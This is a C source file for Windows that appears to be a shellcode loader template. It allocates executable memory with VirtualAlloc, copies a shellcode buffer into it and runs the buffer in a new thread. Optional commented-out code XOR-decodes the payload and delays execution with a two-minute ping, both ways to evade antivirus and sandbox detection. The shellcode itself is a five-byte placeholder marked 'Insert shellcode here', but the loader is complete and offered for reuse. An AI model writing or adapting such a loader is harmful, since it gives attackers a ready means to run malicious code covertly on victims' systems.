#include <stdio.h>
#include <windows.h>



void XorShellcode(IN PBYTE pShellcode, IN SIZE_T dwSize, IN BYTE bKey)
{
	for (SIZE_T i = 0; i < dwSize; i++)
	{
		pShellcode[i] = pShellcode[i] ^ bKey;
	}
}

void ShellcodeLoader()
{
	// Insert shellcode here
	unsigned char shellCode[] = "\x95\x21\xea\x8d\x99";

	//uncomment this to run a ping for 2min and delay execution
	//STARTUPINFOA si = { 0 };
	//PROCESS_INFORMATION pi = { 0 };
	//HANDLE hProc = CreateProcessA(NULL, "C:\\Windows\\system32\\PING.exe localhost -n 120", NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);
	//WaitForSingleObject(pi.hProcess, INFINITE);

	// uncomment this to xor your payload before execution
	//XorShellcode(shellCode, sizeof(shellCode), 0x69);

	HANDLE hVirtualAlloc;
	SIZE_T  dwSize = sizeof(shellCode);

	// Allocate memory for the shellcode
	if ((hVirtualAlloc = VirtualAlloc(NULL, dwSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)) == NULL) {
		printf("VirtualAlloc failed: %d\n", GetLastError());
		return;
	}
	else {
		printf("VirtualAlloc succeeded: %p\n", hVirtualAlloc);
	}

	// Copy shellcode into allocated memory
	if (memcpy(hVirtualAlloc, shellCode, dwSize) == NULL) {
		printf("memcpy failed: %d\n", GetLastError());
		return;
	}
	else {
		printf("memcpy succeeded: %p\n", hVirtualAlloc);
	}

	// Create a thread to execute the shellcode
	HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)hVirtualAlloc, NULL, 0, NULL);
	if (hThread == NULL) {
		printf("CreateThread failed: %d\n", GetLastError());
		return;
	}
	else {
		printf("CreateThread succeeded: %p\n", hThread);
	}

	// Wait for the thread to finish
	WaitForSingleObject(hThread, INFINITE);

}




int main()
{

	ShellcodeLoader();

	return 0;
}
